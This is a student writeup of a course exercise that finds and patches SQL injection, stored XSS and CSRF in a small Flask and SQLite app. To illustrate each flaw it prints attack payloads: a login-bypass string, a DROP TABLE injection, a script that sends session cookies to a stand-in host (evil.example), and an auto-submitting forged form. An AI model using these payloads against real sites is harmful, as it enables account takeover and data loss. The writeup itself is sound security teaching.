---
title: "Machine Problem 3: SQL Injection, XSS, and CSRF in a Flask App"
subtitle: "Finding and Fixing Web Security Vulnerabilities — Writeup"
date: "2026-05-29"
author: "Al Glenrey Tilacas, Princess Parages, Jed Edison Donaire"
excerpt: "Identifying and patching SQL injection, stored cross-site scripting (XSS), and cross-site request forgery (CSRF) vulnerabilities in a simple Flask + SQLite web application."
heroImage: "hero.png"
thumbnail: "hero.png"
---

## 1. Introduction

In this machine problem, we were given a small Flask web application backed by SQLite. The app has a login page and a posts page where a logged-in user can read and create their own posts. Our task was to find every SQL injection, cross-site scripting (XSS), and cross-site request forgery (CSRF) vulnerability present in the code, explain why each one is dangerous, and deliver a patched version of the application.

This writeup walks through each vulnerability in detail: what it is, where exactly it appears in the source code, how an attacker would exploit it, and what the fix looks like.

## 2. Overview of the Vulnerable Application

The application is three files:

- **`app.py`** — the Flask backend with five route handlers: `login`, `home`, `posts`, and `logout`.
- **`templates/login.html`** — the login form.
- **`templates/home.html`** — the authenticated home page with the post form and post list.

The database has three tables: `users` (username + password), `sessions` (user → session token mapping), and `posts` (user → message mapping). Authentication is cookie-based: after a successful login, the server sets a `session_token` cookie, and every subsequent route reads that cookie to look up the logged-in user.

## 3. Vulnerability 1: SQL Injection

### 3.1 What Is SQL Injection

SQL injection (SQLi) happens when user-supplied input is concatenated directly into a SQL query string instead of being passed as a bound parameter. The database driver sees the concatenated string as a single SQL statement, so if the input contains SQL syntax characters like single quotes, the attacker can break out of the intended query and inject arbitrary SQL logic.

### 3.2 Where It Appears

Every single SQL query in the original `app.py` was vulnerable. The code built queries by joining strings together with Python's `+` operator:

**`login()` — GET branch** (session token lookup):
```python
# VULNERABLE
res = cur.execute("SELECT username FROM users INNER JOIN sessions ON "
                  + "users.id = sessions.user WHERE sessions.token = '"
                  + request.cookies.get("session_token") + "'")
```

**`login()` — POST branch** (credential check):
```python
# VULNERABLE
res = cur.execute("SELECT id from users WHERE username = '"
            + request.form["username"]
            + "' AND password = '"
            + request.form["password"] + "'")
```

**`home()`** (session token lookup, then post fetch):
```python
# VULNERABLE
res = cur.execute("SELECT users.id, username FROM users INNER JOIN sessions ON "
                  + "users.id = sessions.user WHERE sessions.token = '"
                  + request.cookies.get("session_token") + "';")
# and later:
res = cur.execute("SELECT message FROM posts WHERE user = " + str(user[0]) + ";")
```

**`posts()`** (session token lookup, then insert):
```python
# VULNERABLE
res = cur.execute("SELECT users.id, username FROM users INNER JOIN sessions ON "
                  + "users.id = sessions.user WHERE sessions.token = '"
                  + request.cookies.get("session_token") + "';")
# and later:
cur.execute("INSERT INTO posts (message, user) VALUES ('"
            + request.form["message"] + "', " + str(user[0]) + ");")
```

**`logout()`** (session token lookup and delete):
```python
# VULNERABLE
res = cur.execute("SELECT users.id, username FROM users INNER JOIN sessions ON "
                  + "users.id = sessions.user WHERE sessions.token = '"
                  + request.cookies.get("session_token") + "'")
# and later:
cur.execute("DELETE FROM sessions WHERE user = " + str(user[0]) + ";")
```

### 3.3 How an Attacker Exploits It

The most critical injection point is the login form's credential check. An attacker can bypass the password entirely by entering the username:

```
' OR '1'='1
```

This transforms the query into:

```sql
SELECT id FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
```

Because `OR '1'='1'` is always true, the query returns the first user in the table (in this case, `alice`) regardless of the password. The attacker is logged in as Alice without knowing her password.

The `posts` insert is also an injection point. An attacker who is already logged in could post a message like:

```
'); DROP TABLE posts; --
```

Which turns the INSERT into:

```sql
INSERT INTO posts (message, user) VALUES (''); DROP TABLE posts; --', 1);
```

This would delete the entire posts table.

### 3.4 The Fix: Parameterized Queries

The fix is to replace string concatenation with parameterized queries. Instead of embedding values into the SQL string, we pass them as a separate tuple of parameters. The SQLite driver handles quoting and escaping automatically — user input can never break out of the value position because it is never parsed as SQL:

```python
# FIXED — login credential check
res = cur.execute(
    "SELECT id FROM users WHERE username = ? AND password = ?",
    (request.form["username"], request.form["password"]),
)

# FIXED — session token lookup
res = cur.execute(
    "SELECT username FROM users INNER JOIN sessions ON "
    "users.id = sessions.user WHERE sessions.token = ?",
    (request.cookies.get("session_token"),),
)

# FIXED — post insert
cur.execute(
    "INSERT INTO posts (message, user) VALUES (?, ?);",
    (request.form["message"], user[0]),
)
```

Every `?` placeholder is a bind parameter. The values in the tuple are passed to the database driver separately and are never interpreted as SQL. The auth-bypass attack above becomes harmless: the username `' OR '1'='1` is treated as a literal string, and no user with that exact username exists, so the query returns nothing.

## 4. Vulnerability 2: Stored Cross-Site Scripting (XSS)

### 4.1 What Is XSS

Cross-site scripting (XSS) happens when a web application takes user-supplied content and renders it in an HTML page without properly escaping it. A browser receiving the page interprets the attacker's payload as HTML or JavaScript rather than as text, so the attacker's script executes in the victim's browser with the victim's session.

Stored XSS specifically means the malicious payload is saved in the application's database and served to every user who views the page — not just the attacker.

### 4.2 Where It Appears

In `templates/home.html`, the post list was rendered as:

```html
<!-- VULNERABLE -->
{% for post in posts %}
<li>{{ post[0] | safe }}</li>
{% endfor %}
```

Jinja2 auto-escapes template variables by default: `{{ post[0] }}` would convert `<` to `&lt;`, `>` to `&gt;`, and so on, so any HTML tags in a post would be displayed as plain text. The `| safe` filter disables this protection and tells Jinja2 to render the value as raw HTML.

### 4.3 How an Attacker Exploits It

An attacker logs in and creates a post with the message:

```
<script>document.location='https://evil.example/steal?c='+document.cookie</script>
```

The server saves this string verbatim to the `posts` table. When any user (including other users, if the app had them) visits `/home`, the template renders:

```html
<li><script>document.location='https://evil.example/steal?c='+document.cookie</script></li>
```

The browser executes the script. It reads the victim's `session_token` cookie and sends it to the attacker's server. The attacker can now use that token to impersonate the victim without ever knowing their password.

Even in a single-user app, this is dangerous: an attacker who tricks Alice into clicking a link that navigates to `/home` can steal Alice's session.

A simpler payload that proves the issue requires no server at all:

```
<script>alert(document.cookie)</script>
```

### 4.4 The Fix: Remove the `| safe` Filter

The fix is to remove `| safe` so that Jinja2's default escaping applies:

```html
<!-- FIXED -->
{% for post in posts %}
<li>{{ post[0] }}</li>
{% endfor %}
```

With this change, the `<script>` payload above is stored in the database exactly as the user typed it, but when rendered in the template it becomes:

```html
<li>&lt;script&gt;document.location=...&lt;/script&gt;</li>
```

The browser displays it as literal text. No script runs.

## 5. Vulnerability 3: Cross-Site Request Forgery (CSRF)

### 5.1 What Is CSRF

Cross-site request forgery tricks a victim's browser into making an authenticated HTTP request to a site the victim is already logged in to. Browsers automatically attach cookies (including session tokens) to every request to the matching domain, regardless of which site initiated the request. If the target application does not validate that the request came from its own pages, a malicious third-party page can silently perform actions on behalf of the victim.

### 5.2 Where It Appears

The `POST /posts` route accepted form submissions with no token validation:

```python
# VULNERABLE — no CSRF check
@app.route("/posts", methods=["POST"])
def posts():
    cur = con.cursor()
    if request.cookies.get("session_token"):
        res = cur.execute(...)  # look up user from cookie
        user = res.fetchone()
        if user:
            cur.execute("INSERT INTO posts (message, user) ...")
            con.commit()
            return redirect("/home")
    return redirect("/login")
```

There is also no `app.secret_key` set, which means Flask's session mechanism (needed for server-side token storage) does not work at all.

The login form (`POST /login`) was also unprotected, which enables login CSRF — an attacker can silently log a victim into the attacker's own account, allowing the attacker to later see anything the victim typed or posted.

### 5.3 How an Attacker Exploits It

An attacker hosts the following page at `https://evil.example/attack.html`:

```html
<form id="f" method="post" action="http://localhost:5000/posts">
  <input type="hidden" name="message" value="Account compromised by attacker!">
</form>
<script>document.getElementById('f').submit();</script>
```

If Alice visits `https://evil.example/attack.html` while logged in to the Flask app, her browser auto-submits the form to `http://localhost:5000/posts`. Her `session_token` cookie is attached automatically. The server authenticates the cookie, looks up Alice's account, and inserts the attacker's message as one of Alice's posts. Alice never clicked anything.

### 5.4 The Fix: Synchronizer Token Pattern

The standard fix is the **synchronizer token pattern**: the server generates a secret random token, stores it in the user's server-side session, and includes it as a hidden field in every form. On every state-changing POST, the server verifies that the submitted token matches the one stored in the session. An attacker's page on another origin cannot read the token (same-origin policy prevents cross-origin reads), so they cannot forge a valid request.

**Step 1 — Set a secret key** so Flask can sign the session cookie securely:

```python
app.secret_key = secrets.token_hex(32)
```

**Step 2 — Add token generation and validation helpers:**

```python
def _get_csrf_token():
    if "csrf_token" not in session:
        session["csrf_token"] = secrets.token_hex(32)
    return session["csrf_token"]

def _validate_csrf():
    token = request.form.get("csrf_token", "")
    return secrets.compare_digest(token, session.get("csrf_token", ""))
```

`secrets.compare_digest` is used instead of `==` to prevent timing attacks that could leak the token length through response time differences.

**Step 3 — Pass the token to every form template:**

```python
return render_template("home.html", ..., csrf_token=_get_csrf_token())
return render_template("login.html", csrf_token=_get_csrf_token())
```

**Step 4 — Embed the token as a hidden field in both forms:**

```html
<!-- In home.html and login.html -->
<form method="post" action="/posts">
  <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
  ...
</form>
```

**Step 5 — Validate on every POST handler:**

```python
@app.route("/posts", methods=["POST"])
def posts():
    ...
    if not _validate_csrf():
        return redirect("/home")
    ...

@app.route("/login", methods=["GET", "POST"])
def login():
    ...
    if not _validate_csrf():
        return render_template("login.html", ..., error="Invalid request.")
    ...
```

Now an attacker's forged form lacks the correct token, and the request is rejected.

As a bonus hardening measure, the `session_token` cookie was updated to use `httponly=True` and `samesite="Strict"`. `HttpOnly` prevents JavaScript from reading the cookie (limiting XSS damage), and `SameSite=Strict` instructs modern browsers to never attach the cookie on cross-site requests at all — an additional layer of CSRF defense.

## 6. Summary of All Fixes

<table>
  <thead>
    <tr>
      <th>Vulnerability</th>
      <th>Location</th>
      <th>Root Cause</th>
      <th>Fix</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>SQL Injection (auth bypass)</td>
      <td><code>login()</code> POST</td>
      <td>String concatenation in credential query</td>
      <td>Parameterized query with <code>?</code> placeholders</td>
    </tr>
    <tr>
      <td>SQL Injection (session lookup)</td>
      <td><code>login()</code> GET, <code>home()</code>, <code>posts()</code>, <code>logout()</code></td>
      <td>String concatenation with cookie value</td>
      <td>Parameterized query with <code>?</code> placeholders</td>
    </tr>
    <tr>
      <td>SQL Injection (post insert)</td>
      <td><code>posts()</code></td>
      <td>String concatenation with form input</td>
      <td>Parameterized query with <code>?</code> placeholders</td>
    </tr>
    <tr>
      <td>Stored XSS</td>
      <td><code>home.html</code> line 19</td>
      <td>The <code>safe</code> filter disables Jinja2 auto-escaping</td>
      <td>Removed the <code>safe</code> filter; Jinja2 escapes by default</td>
    </tr>
    <tr>
      <td>CSRF (post creation)</td>
      <td><code>POST /posts</code></td>
      <td>No token validation</td>
      <td>Synchronizer token pattern</td>
    </tr>
    <tr>
      <td>CSRF (login)</td>
      <td><code>POST /login</code></td>
      <td>No token validation</td>
      <td>Synchronizer token pattern</td>
    </tr>
  </tbody>
</table>

## 7. Conclusion

The original application concentrated several textbook vulnerabilities in a very small codebase. All three vulnerability classes — SQL injection, XSS, and CSRF — stemmed from the same root cause: **trusting user-supplied input without validation or sanitization**.

SQL injection came from building queries by string concatenation instead of using the parameterized query API that every modern database driver provides. XSS came from explicitly opting out of the template engine's built-in escaping with `| safe`. CSRF came from the absence of any mechanism to distinguish requests originating from the application's own forms from requests forged by a third-party page.

Each fix was targeted and minimal. Parameterized queries eliminate SQLi without any structural change to the application logic. Removing `| safe` restores Jinja2's default protection. The synchronizer token pattern adds roughly 15 lines of code and a hidden field to each form. None of these fixes require external libraries, complex frameworks, or significant refactoring — they are the baseline practice that should have been in place from the start.
